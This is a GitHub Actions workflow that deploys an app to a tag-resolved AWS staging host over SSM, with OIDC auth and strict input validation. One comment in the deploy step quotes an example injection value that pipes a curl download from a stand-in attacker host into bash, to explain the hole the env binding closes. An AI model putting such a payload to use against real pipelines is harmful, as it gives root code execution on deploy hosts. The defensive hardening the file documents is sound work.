name: Reusable Staging Deploy

# Deploys one application to the staging host.
#
# Two decisions here differ from the existing deploy workflows, and both exist
# to make staging DISCARDABLE -- destroyable on a Friday, rebuilt on a Monday,
# with no human in the loop.
#
#   1. The host is found BY TAG, never by IP or instance id. A rebuilt host has
#      a new id and a new address; anything hardcoded breaks the moment staging
#      is recreated, which is exactly when it must not break.
#
#   2. Delivery is via SSM, not SSH. A fresh host registers with SSM through its
#      instance profile within about a minute of boot -- no key pair to create,
#      distribute or rotate, and every command is recorded in CloudTrail. The
#      appleboy/ssh-action pattern used elsewhere needs a key on a host that
#      does not exist yet.
#
# Auth is OIDC. No long-lived AWS keys in repository secrets.

on:
  workflow_call:
    inputs:
      app-name:
        description: "Application name. Must match the Name tag prefix of its compose directory under /opt/seolith/staging/."
        required: true
        type: string
      compose-files:
        description: >-
          Space-separated compose files, applied in order, relative to the app
          directory. Most apps here use OVERLAYS -- pto-admin's
          docker-compose.staging.yml declares an `api` service with no image or
          build, so it only works layered over the base docker-compose.yml.
          Passing the overlay alone fails with a missing-image error.
        required: false
        type: string
        default: "docker-compose.yml docker-compose.staging.yml"
      image-tag:
        description: "Image tag to deploy. Defaults to the triggering commit."
        required: false
        type: string
        default: ""
      health-url:
        description: "URL polled after deploy. Empty skips the check -- discouraged."
        required: false
        type: string
        default: ""
      health-timeout-seconds:
        required: false
        type: number
        default: 180
      environment-tag:
        description: "Value of the Environment tag identifying the target host."
        required: false
        type: string
        default: "staging"
      aws-region:
        required: false
        type: string
        default: "us-east-2"
      runs-on:
        description: >-
          GitHub-hosted by default, deliberately. Staging rebuild must not
          depend on self-hosted runners in an office; if that hardware is down,
          the rebuild button has to still work.
        required: false
        type: string
        default: '["ubuntu-latest"]'
    secrets:
      AWS_DEPLOY_ROLE_ARN:
        description: "Role assumed via OIDC. Needs ssm:SendCommand and ec2:DescribeInstances."
        required: true

permissions:
  contents: read
  id-token: write # required for OIDC

jobs:
  deploy:
    runs-on: ${{ fromJSON(inputs.runs-on) }}
    timeout-minutes: 20

    steps:
      - uses: actions/checkout@v5

      - name: Configure AWS credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
          aws-region: ${{ inputs.aws-region }}
          role-session-name: deploy-${{ inputs.app-name }}-${{ github.run_id }}

      - name: Resolve the staging host by tag
        id: host
        env:
          ENVIRONMENT_TAG: ${{ inputs.environment-tag }}
        run: |
          set -euo pipefail
          # Deliberately NOT an instance id. Whatever host currently carries the
          # staging tag is the target, including one created ten minutes ago.
          ID=$(aws ec2 describe-instances \
                --filters "Name=tag:Environment,Values=$ENVIRONMENT_TAG" \
                          "Name=tag:Role,Values=app-host" \
                          "Name=instance-state-name,Values=running" \
                --query 'Reservations[].Instances[].InstanceId' --output text)

          COUNT=$(echo "$ID" | wc -w)
          if [ "$COUNT" -eq 0 ]; then
            echo "::error::No running host tagged Environment=$ENVIRONMENT_TAG, Role=app-host. Run the staging Terraform first."
            exit 1
          fi
          if [ "$COUNT" -gt 1 ]; then
            echo "::error::$COUNT hosts match. Refusing to guess: $ID"
            exit 1
          fi

          echo "instance-id=$ID" >> "$GITHUB_OUTPUT"
          echo "Target: $ID"

      - name: Wait for SSM to be ready
        run: |
          set -euo pipefail
          # A freshly built host may not have registered yet. Waiting here is
          # what lets a rebuild deploy immediately rather than failing once and
          # needing a manual retry.
          for i in $(seq 1 30); do
            PING=$(aws ssm describe-instance-information \
                    --filters "Key=InstanceIds,Values=${{ steps.host.outputs.instance-id }}" \
                    --query 'InstanceInformationList[0].PingStatus' --output text 2>/dev/null || echo "None")
            [ "$PING" = "Online" ] && { echo "SSM online after ${i} attempt(s)"; exit 0; }
            sleep 10
          done
          echo "::error::SSM did not come online within 5 minutes."
          exit 1

      - name: Deploy
        id: deploy
        # Inputs are bound to env, NEVER interpolated as ${{ }} into the script.
        #
        # This is a security boundary, not a style preference. GitHub substitutes
        # ${{ }} as raw TEXT before bash ever sees the line, so a caller passing
        #     image-tag: 'x"$(curl -s http://attacker/p | bash)"'
        # got that text spliced into the runner's shell. Worse, the value was then
        # baked into the CMD heredoc, base64'd, and executed AS ROOT on the staging
        # host over SSM. Any of the nine repositories trusted by this workflow could
        # reach a host in the account that also runs production.
        #
        # Bound through env, "$IMAGE_TAG" expands to a value and bash does not
        # re-evaluate what comes out, so command substitution inside the value stays
        # inert. The validation below then rejects it outright anyway.
        env:
          IMAGE_TAG_IN: ${{ inputs.image-tag }}
          APP_NAME: ${{ inputs.app-name }}
          COMPOSE_FILES: ${{ inputs.compose-files }}
        run: |
          set -euo pipefail

          # Reject anything that is not a plain tag or path fragment BEFORE it can
          # reach the host. Defence in depth: env binding stops execution on the
          # runner, this stops the value being written into a script that root runs.
          case "$IMAGE_TAG_IN" in
            "" ) TAG="${GITHUB_SHA::7}" ;;
            *[!A-Za-z0-9._-]* )
              echo "::error::Refusing image-tag '$IMAGE_TAG_IN' -- only [A-Za-z0-9._-] permitted."
              exit 1 ;;
            * ) TAG="$IMAGE_TAG_IN" ;;
          esac
          case "$APP_NAME" in
            ""|*[!A-Za-z0-9._-]* )
              echo "::error::Refusing app-name '$APP_NAME' -- only [A-Za-z0-9._-] permitted."
              exit 1 ;;
          esac
          case "$COMPOSE_FILES" in
            ""|*[!A-Za-z0-9._/\ -]* )
              echo "::error::Refusing compose-files '$COMPOSE_FILES' -- only [A-Za-z0-9._/-] and spaces permitted."
              exit 1 ;;
          esac

          APP_DIR="/opt/seolith/staging/$APP_NAME"

          # Idempotent by construction: creates the directory if absent, pulls,
          # and brings the stack up. Assumes nothing already exists on the host.
          CMD=$(cat <<EOF
          set -euo pipefail
          mkdir -p "$APP_DIR"
          cd "$APP_DIR"
          # Build the -f chain. Order matters: later files override earlier
          # ones, so the base must come first.
          FLAGS=""
          for f in $COMPOSE_FILES; do
            if [ ! -f "\$f" ]; then
              echo "MISSING_COMPOSE: \$f not found in $APP_DIR" >&2
              ls -1 "$APP_DIR" >&2
              exit 2
            fi
            FLAGS="\$FLAGS -f \$f"
          done

          export IMAGE_TAG="$TAG"
          docker compose \$FLAGS config --quiet
          docker compose \$FLAGS pull --quiet || true
          docker compose \$FLAGS up -d --remove-orphans
          docker compose \$FLAGS ps
          EOF
          )

          # Ship the script base64-encoded rather than embedding it in JSON.
          #
          # Two problems solved at once. The first version used `jq -Rs .` to
          # escape the script; jq ships on GitHub-hosted runners but NOT on the
          # self-hosted runner this workflow now uses, so it died with
          # "jq: command not found" before sending anything. The second is that
          # the script is full of quotes, newlines and $ signs -- exactly the
          # characters that make hand-rolled JSON escaping fragile.
          #
          # base64 output is [A-Za-z0-9+/=] only, so it drops into a JSON string
          # with no escaping at all, and printf can build the document safely.
          # base64 is coreutils, present wherever bash is.
          B64=$(printf '%s' "$CMD" | base64 -w0 2>/dev/null || printf '%s' "$CMD" | base64 | tr -d '\n')

          PARAMS="$RUNNER_TEMP/ssm-params-$GITHUB_RUN_ID.json"
          printf '{"commands":["echo %s | base64 -d | bash"]}' "$B64" > "$PARAMS"

          CMD_ID=$(aws ssm send-command \
            --instance-ids "${{ steps.host.outputs.instance-id }}" \
            --document-name "AWS-RunShellScript" \
            --comment "deploy $APP_NAME @ $TAG" \
            --timeout-seconds 900 \
            --parameters "file://$PARAMS" \
            --query 'Command.CommandId' --output text)

          echo "command-id=$CMD_ID" >> "$GITHUB_OUTPUT"
          aws ssm wait command-executed \
            --command-id "$CMD_ID" \
            --instance-id "${{ steps.host.outputs.instance-id }}" || true

          STATUS=$(aws ssm get-command-invocation --command-id "$CMD_ID" \
                    --instance-id "${{ steps.host.outputs.instance-id }}" \
                    --query 'Status' --output text)
          echo "--- stdout ---"
          aws ssm get-command-invocation --command-id "$CMD_ID" \
            --instance-id "${{ steps.host.outputs.instance-id }}" \
            --query 'StandardOutputContent' --output text
          if [ "$STATUS" != "Success" ]; then
            echo "--- stderr ---"
            aws ssm get-command-invocation --command-id "$CMD_ID" \
              --instance-id "${{ steps.host.outputs.instance-id }}" \
              --query 'StandardErrorContent' --output text
            echo "::error::Deploy failed with status $STATUS"
            exit 1
          fi

      - name: Health check
        if: inputs.health-url != ''
        # Same boundary as the deploy step. A URL is data, not shell -- interpolated
        # directly it is a second injection site reachable by any of the nine callers.
        env:
          HEALTH_URL: ${{ inputs.health-url }}
          HEALTH_TIMEOUT: ${{ inputs.health-timeout-seconds }}
          APP_NAME: ${{ inputs.app-name }}
        run: |
          set -euo pipefail
          case "$HEALTH_TIMEOUT" in ''|*[!0-9]*) echo "::error::health-timeout-seconds must be an integer."; exit 1 ;; esac
          case "$HEALTH_URL" in
            http://*|https://*) ;;
            *) echo "::error::health-url must be an http(s) URL."; exit 1 ;;
          esac
          DEADLINE=$(( $(date +%s) + HEALTH_TIMEOUT ))
          until [ "$(date +%s)" -ge "$DEADLINE" ]; do
            CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "$HEALTH_URL" || echo 000)
            if [ "$CODE" -ge 200 ] && [ "$CODE" -lt 400 ]; then
              echo "Healthy (HTTP $CODE)"
              exit 0
            fi
            echo "waiting... (HTTP $CODE)"
            sleep 10
          done
          echo "::error::$APP_NAME did not become healthy within ${HEALTH_TIMEOUT}s."
          exit 1

      - name: Summary
        if: always()
        env:
          APP_NAME: ${{ inputs.app-name }}
          COMPOSE_FILES: ${{ inputs.compose-files }}
        run: |
          {
            echo "### Staging deploy — $APP_NAME"
            echo ""
            echo "| | |"
            echo "|---|---|"
            echo "| Host | \`${{ steps.host.outputs.instance-id }}\` |"
            echo "| Compose | \`$COMPOSE_FILES\` |"
            echo "| SSM command | \`${{ steps.deploy.outputs.command-id }}\` |"
            echo "| Result | ${{ job.status }} |"
          } >> "$GITHUB_STEP_SUMMARY"
